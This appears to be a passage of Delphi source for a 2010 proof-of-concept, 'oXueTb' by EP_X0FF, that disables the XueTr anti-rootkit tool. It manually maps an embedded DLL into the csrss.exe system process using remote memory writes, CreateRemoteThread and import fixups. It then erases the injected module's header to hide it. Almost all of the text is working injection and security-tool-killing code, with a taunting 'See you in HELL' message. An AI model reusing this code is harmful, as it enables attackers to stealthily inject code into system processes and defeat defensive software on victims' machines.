    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00
    );

  IMPORTED_NAME_OFFSET = $00000002;
  IMAGE_ORDINAL_FLAG32 = $80000000;
  IMAGE_ORDINAL_MASK32 = $0000FFFF;

type
  TDllEntryProc = function(hinstDLL: HMODULE; dwReason: dword;
    lpvReserved: pointer): boolean; stdcall;

  TSections = array[0..0] of TImageSectionHeader;

  PLibInfo = ^TLibInfo;
  TLibInfo = packed record
    ImageBase: pointer;
    ImageSize: longint;
    DllProc: TDllEntryProc;
    DllProcAddress: pointer;
  end;

  PImageBaseRelocation = ^TImageBaseRelocation;
  TImageBaseRelocation = packed record
    VirtualAddress: dword;
    SizeOfBlock: dword;
  end;

  PImageImportDescriptor = ^TImageImportDescriptor;
  TImageImportDescriptor = packed record
    OriginalFirstThunk: dword;
    TimeDateStamp: dword;
    ForwarderChain: dword;
    Name: dword;
    FirstThunk: dword;
  end;

function GetSectionProtection(ImageScn: dword): dword;
begin
  Result := 0;
  if (ImageScn and IMAGE_SCN_MEM_NOT_CACHED) <> 0 then
    Result := Result or PAGE_NOCACHE;
  if (ImageScn and IMAGE_SCN_MEM_EXECUTE) <> 0 then
  begin
    if (ImageScn and IMAGE_SCN_MEM_READ) <> 0 then
    begin
      if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
        Result := Result or PAGE_EXECUTE_READWRITE
      else Result := Result or PAGE_EXECUTE_READ;

    end
    else if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
      Result := Result or PAGE_EXECUTE_WRITECOPY
    else Result := Result or PAGE_EXECUTE;

  end
  else if (ImageScn and IMAGE_SCN_MEM_READ) <> 0 then
  begin
    if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
      Result := Result or PAGE_READWRITE
    else Result := Result or PAGE_READONLY;

  end
  else if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
    Result := Result or PAGE_WRITECOPY
  else Result := Result or PAGE_NOACCESS;
end;

function InjectMemory(Process: dword; Memory: pointer; Size: dword): pointer;
var
  BytesWritten: dword;
begin
  result := nil;
  ZwAllocateVirtualMemory(Process, @result, 0, @Size, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (result <> nil) then
    ZwWriteVirtualMemory(Process, Result, Memory, Size, @BytesWritten);
end;

function InjectThread(Process: dword; Thread: pointer; Info: pointer;
  InfoLen: dword; Results: boolean): THandle;
var
  pThread, pInfo: pointer;
  BytesRead, TID: dword;
begin
  pInfo := InjectMemory(Process, Info, InfoLen);
  pThread := InjectMemory(Process, Thread, SizeOfProc(Thread));
  Result := CreateRemoteThread(Process, nil, 0, pThread, pInfo, 0, TID);
  if Results then
  begin
    ZwWaitForSingleObject(Result, false, nil);
    ZwReadVirtualMemory(Process, pInfo, Info, InfoLen, @BytesRead);
  end;
end;

function InjectString(Process: dword; Text: PChar): PChar;
var
  BytesWritten: dword;
  Size: DWORD;
begin
  result := nil;
  Size := strlenA(Text) + 1;
  BytesWritten := Size;
  ZwAllocateVirtualMemory(Process, @result, 0, @BytesWritten, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (result <> nil) then
    ZwWriteVirtualMemory(Process, Result, Text, Size, @BytesWritten);
end;

function GetProcAddressEx(Process: dword; lpModuleName,
  lpProcName: pchar; dwProcLen: dword): pointer;
type
  TGetProcAddrExInfo = record
    pExitThread: pointer;
    pGetProcAddress: pointer;
    pGetModuleHandle: pointer;
    lpModuleName: pointer;
    lpProcName: pointer;
  end;
var
  GetProcAddrExInfo: TGetProcAddrExInfo;
  BasicInformation: THREAD_BASIC_INFORMATION;
  hThread: dword;

  procedure GetProcAddrExThread(lpParameter: pointer); stdcall;
  var
    GetProcAddrExInfo: TGetProcAddrExInfo;
  begin
    GetProcAddrExInfo := TGetProcAddrExInfo(lpParameter^);
    asm
      push GetProcAddrExInfo.lpModuleName
      call GetProcAddrExInfo.pGetModuleHandle
      push GetProcAddrExInfo.lpProcName
      push eax
      call GetProcAddrExInfo.pGetProcAddress
      push eax
      call GetProcAddrExInfo.pExitThread
    end;
  end;

begin
  Result := nil;
  GetProcAddrExInfo.pGetModuleHandle := GetProcAddress(GetModuleHandleW(kernel32), 'GetModuleHandleA');
  GetProcAddrExInfo.pGetProcAddress := GetProcAddress(GetModuleHandleW(kernel32), 'GetProcAddress');
  GetProcAddrExInfo.pExitThread := GetProcAddress(GetModuleHandleW(kernel32), 'ExitThread');
  if dwProcLen = 4 then GetProcAddrExInfo.lpProcName := lpProcName else
    GetProcAddrExInfo.lpProcName := InjectMemory(Process, lpProcName, dwProcLen);

  GetProcAddrExInfo.lpModuleName := InjectString(Process, lpModuleName);
  hThread := InjectThread(Process, @GetProcAddrExThread, @GetProcAddrExInfo,
    SizeOf(GetProcAddrExInfo), False);

  if hThread <> 0 then
  begin
    ZwWaitForSingleObject(hThread, false, nil);
    memzero(@BasicInformation, sizeof(BasicInformation));
    ZwQueryInformationThread(hThread, ThreadBasicInformation, @BasicInformation, sizeof(BasicInformation), nil);
    result := pointer(BasicInformation.ExitStatus);
  end;
end;

function MapLibrary(Process: dword; Dest, Src: pointer): TLibInfo;
var
  ImageBase: pointer;
  ImageBaseDelta: integer;
  ImageNtHeaders: PImageNtHeaders;
  PSections: ^TSections;
  SectionLoop: integer;
  SectionBase: pointer;
  VirtualSectionSize, RawSectionSize: dword;
  OldProtect: dword;
  bytesIO: DWORD;
  Addr: PChar;
  NewLibInfo: TLibInfo;

  procedure ProcessRelocs(PRelocs: PImageBaseRelocation);
  var
    PReloc: PImageBaseRelocation;
    RelocsSize: dword;
    Reloc: PWord;
    ModCount: dword;
    RelocLoop: dword;
  begin
    PReloc := PRelocs;
    RelocsSize := ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    while dword(PReloc) - dword(PRelocs) < RelocsSize do
    begin
      ModCount := (PReloc.SizeOfBlock - Sizeof(PReloc^)) div 2;
      Reloc := pointer(dword(PReloc) + sizeof(PReloc^));
      for RelocLoop := 0 to ModCount - 1 do
      begin
        if Reloc^ and $F000 <> 0 then Inc(pdword(dword(ImageBase) +
            PReloc.VirtualAddress +
            (Reloc^ and $0FFF))^, ImageBaseDelta);
        Inc(Reloc);
      end;
      PReloc := pointer(Reloc);
    end;
  end;

  procedure ProcessImports(PImports: PImageImportDescriptor);
  var
    PImport: PImageImportDescriptor;
    Import: pdword;
    PImportedName: pchar;
    ProcAddress: pointer;
    PLibName: pchar;

    function IsImportByOrdinal(ImportDescriptor: dword): boolean;
    begin
      Result := (ImportDescriptor and IMAGE_ORDINAL_FLAG32) <> 0;
    end;

  begin
    PImport := PImports;
    while PImport.Name <> 0 do
    begin
      PLibName := pchar(dword(PImport.Name) + dword(ImageBase));

      if PImport.TimeDateStamp = 0 then
        Import := pdword(pImport.FirstThunk + dword(ImageBase))
      else
        Import := pdword(pImport.OriginalFirstThunk + dword(ImageBase));

      while Import^ <> 0 do
      begin
        if IsImportByOrdinal(Import^) then
          ProcAddress := GetProcAddressEx(Process, PLibName, PChar(Import^ and $FFFF), 4)
        else
        begin
          PImportedName := pchar(Import^ + dword(ImageBase) + IMPORTED_NAME_OFFSET);
          ProcAddress := GetProcAddressEx(Process, PLibName, PImportedName, strlenA(PImportedName));
        end;
        Ppointer(Import)^ := ProcAddress;
        Inc(Import);
      end;
      Inc(PImport);
    end;
  end;

begin
  ImageNtHeaders := pointer(dword(Src) + dword(PImageDosHeader(Src)._lfanew));

  bytesIO := ImageNtHeaders.OptionalHeader.SizeOfImage;
  ImageBase := Dest;
  ZwAllocateVirtualMemory(NtCurrentProcess, @ImageBase, 0, @bytesIO, MEM_RESERVE, PAGE_NOACCESS);

  ImageBaseDelta := dword(ImageBase) - ImageNtHeaders.OptionalHeader.ImageBase;

  bytesIO := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
  SectionBase := ImageBase;
  ZwAllocateVirtualMemory(NtCurrentProcess, @SectionBase, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);

  memcopy(SectionBase, Src, ImageNtHeaders.OptionalHeader.SizeOfHeaders);

  bytesIO := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
  ZwProtectVirtualMemory(NtCurrentProcess, @SectionBase, @bytesIO, PAGE_READONLY, @OldProtect);

  PSections := pointer(pchar(@(ImageNtHeaders.OptionalHeader)) +
    ImageNtHeaders.FileHeader.SizeOfOptionalHeader);

  for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do
  begin
    VirtualSectionSize := PSections[SectionLoop].Misc.VirtualSize;
    RawSectionSize := PSections[SectionLoop].SizeOfRawData;
    if VirtualSectionSize < RawSectionSize then
    begin
      VirtualSectionSize := VirtualSectionSize xor RawSectionSize;
      RawSectionSize := VirtualSectionSize xor RawSectionSize;
      VirtualSectionSize := VirtualSectionSize xor RawSectionSize;
    end;

    SectionBase := PSections[SectionLoop].VirtualAddress + pchar(ImageBase);
    bytesIO := VirtualSectionSize;
    ZwAllocateVirtualMemory(NtCurrentProcess, @SectionBase, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);

    memzero(SectionBase, VirtualSectionSize);
    memcopy(SectionBase, (pchar(src) + PSections[SectionLoop].pointerToRawData), RawSectionSize);
  end;

  NewLibInfo.DllProcAddress := pointer(ImageNtHeaders.OptionalHeader.AddressOfEntryPoint +
    dword(ImageBase));
  NewLibInfo.DllProc := TDllEntryProc(NewLibInfo.DllProcAddress);

  NewLibInfo.ImageBase := ImageBase;
  NewLibInfo.ImageSize := ImageNtHeaders.OptionalHeader.SizeOfImage;

  if ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress <> 0
    then ProcessRelocs(pointer(ImageNtHeaders.OptionalHeader.
      DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].
      VirtualAddress + dword(ImageBase)));

  if ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress <> 0
    then ProcessImports(pointer(ImageNtHeaders.OptionalHeader.
      DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].
      VirtualAddress + dword(ImageBase)));

  for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do
  begin
    bytesIO := PSections[SectionLoop].Misc.VirtualSize;
    Addr := PSections[SectionLoop].VirtualAddress + pchar(ImageBase);
    ZwProtectVirtualMemory(NtCurrentProcess, @Addr,
      @bytesIO, GetSectionProtection(PSections[SectionLoop].Characteristics), @OldProtect);
  end;
  Result := NewLibInfo;
end;

function memopen(Process: THANDLE; p: pointer; OldProtect: DWORD): BOOLEAN;
var
  bytesIO: DWORD;
  buf: pointer;
begin
  bytesIO := 4096;
  buf := p;
  result := (ZwProtectVirtualMemory(Process, @buf, @bytesIO, PAGE_EXECUTE_READWRITE, @OldProtect) = STATUS_SUCCESS);
end;

function memclose(Process: THANDLE; p: pointer; OldProtect: DWORD): BOOLEAN;
var
  pr, bytesIO: DWORD;
  buf: pointer;
begin
  bytesIO := 4096;
  buf := p;
  result := (ZwProtectVirtualMemory(Process, @buf, @bytesIO, OldProtect, @pr) = STATUS_SUCCESS);
end;

function InjectDllEx(Process: dword; Src: pointer): boolean;
type
  TDllLoadInfo = packed record
    Module: pointer;
    EntryPoint: pointer;
  end;
var
  Lib: TLibInfo;
  ImageNtHeaders: PImageNtHeaders;
  pModule: pointer;
  OldProtect: DWORD;
  BytesWritten: DWORD;
  Offset: DWORD;
  hThread: DWORD;
  bytesIO: DWORD;
  DllLoadInfo: TDllLoadInfo;

  procedure DllEntryPoint(lpParameter: pointer); stdcall;
  var
    LoadInfo: TDllLoadInfo;
  begin
    LoadInfo := TDllLoadInfo(lpParameter^);
    asm
      xor eax, eax
      push eax
      push DLL_PROCESS_ATTACH
      push LoadInfo.Module
      call LoadInfo.EntryPoint
    end;
  end;

begin
  Result := False;
  ImageNtHeaders := pointer(dword(Src) + dword(PImageDosHeader(Src)._lfanew));
  Offset := $10000000;
  repeat
    Inc(Offset, $10000);

    pModule := pointer(ImageNtHeaders.OptionalHeader.ImageBase + Offset);
    bytesIO := ImageNtHeaders.OptionalHeader.SizeOfImage;
    ZwAllocateVirtualMemory(NtCurrentProcess, @pModule, 0, @bytesIO, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (pModule <> nil) then
    begin
      bytesIO := 0;
      ZwFreeVirtualMemory(NtCurrentProcess, @pModule, @bytesIO, MEM_RELEASE);

      bytesIO := ImageNtHeaders.OptionalHeader.SizeOfImage;
      pModule := pointer(ImageNtHeaders.OptionalHeader.ImageBase + Offset);
      ZwAllocateVirtualMemory(Process, @pModule, 0, @bytesIO, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    end;
  until ((pModule <> nil) or (Offset > $30000000));
  Lib := MapLibrary(Process, pModule, Src);
  if Lib.ImageBase = nil then Exit;
  DllLoadInfo.Module := Lib.ImageBase;
  DllLoadInfo.EntryPoint := Lib.DllProcAddress;

  ZwWriteVirtualMemory(Process, pModule, Lib.ImageBase, Lib.ImageSize, @BytesWritten);

  hThread := InjectThread(Process, @DllEntryPoint, @DllLoadInfo,
    SizeOf(TDllLoadInfo), False);
  Result := (hThread <> 0);
  OldProtect := 0;
  if (Result) then
    if (memopen(Process, pModule, OldProtect)) then
    begin
      bytesIO := 512;
      memfill(@tmp2, sizeof(tmp2), $F);
      ZwWriteVirtualMemory(Process, pModule, @tmp2, bytesIO, @BytesWritten);
      memclose(Process, pModule, OldProtect);
    end;
end;

function ShowMessage(PStr: PWideChar; Buttons: DWORD): DWORD;
begin
  result := MessageBoxW(GetDesktopWindow(), PStr, 'UG North 2010 Fuzzers Pack', Buttons);
end;

function GetTargetProcessHandle(): THANDLE;
var
  attr: OBJECT_ATTRIBUTES;
  cid1: CLIENT_ID;
begin
  result := 0;
  cid1.UniqueProcess := CsrGetProcessId();
  cid1.UniqueThread := 0;
  InitializeObjectAttributes(@attr, nil, 0, 0, nil);
  if (ZwOpenProcess(@result, PROCESS_ALL_ACCESS, @attr, @cid1) <> STATUS_SUCCESS) then result := 0;
end;

function TargetIsRunning(): BOOLEAN; stdcall;
var
  str1: UNICODE_STRING;
  attr: OBJECT_ATTRIBUTES;
  id1: THANDLE;
begin
  result := false;
  RtlInitUnicodeString(@str1, '\??\XueTr');
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwOpenSymbolicLinkObject(@id1, SYMBOLIC_LINK_QUERY, @attr) = STATUS_SUCCESS) then
  begin
    result := true;
    ZwClose(id1);
  end;
end;

const
  String6: PWideChar = '\BaseNamedObjects\oxuetb';
  String7: PWideChar = 'Failed at injection stage';

var
  osver: OSVERSIONINFOEXW;
  hCsrss: THANDLE;
  str1: UNICODE_STRING;
  attr: OBJECT_ATTRIBUTES;
  EventHandle: THANDLE;
begin
  osver.old.dwOSVersionInfoSize := sizeof(osver.old);
  RtlGetVersion(@osver);
  if (osver.old.dwBuildNumber <> 2600) then exit;

  MessageBoxW(0, 'This simple app demonstrates how to destroy untouchable XueTr from poor User Mode'#13#13#10 +
    'Inline Hooks will not help XueTr!'#13#10'Demo by EP_X0FF, continuation of DNY/Ms-Rem ideas (ñ) 2010 UG North', 'oXueTb', 0);
  if (TargetIsRunning()) then
  begin
    if (Internal_AdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE) = STATUS_SUCCESS) then
    begin
      hCsrss := GetTargetProcessHandle();
      if (hCsrss <> 0) then
      begin
        EventHandle := 0;
        RtlInitUnicodeString(@str1, String6);
        InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
        ZwCreateEvent(@EventHandle, EVENT_ALL_ACCESS, @attr, NotificationEvent, FALSE);
        if (EventHandle = 0) then
        begin
          ZwOpenEvent(@EventHandle, EVENT_ALL_ACCESS, @attr);
        end;
        if (EventHandle <> 0) then
        begin
          if InjectDllEx(hCsrss, @data) then
          begin
            if (ZwWaitForSingleObject(EventHandle, false, nil) = 0) then
              ShowMessage('See you in HELL ^_^', MB_ICONINFORMATION);
          end;
          ZwClose(EventHandle);
        end;

      end;
    end;
  end else ShowMessage('XueTr not loaded, load it first =)', MB_ICONINFORMATION);
  ZwTerminateProcess(NtCurrentProcess, 0);
end.

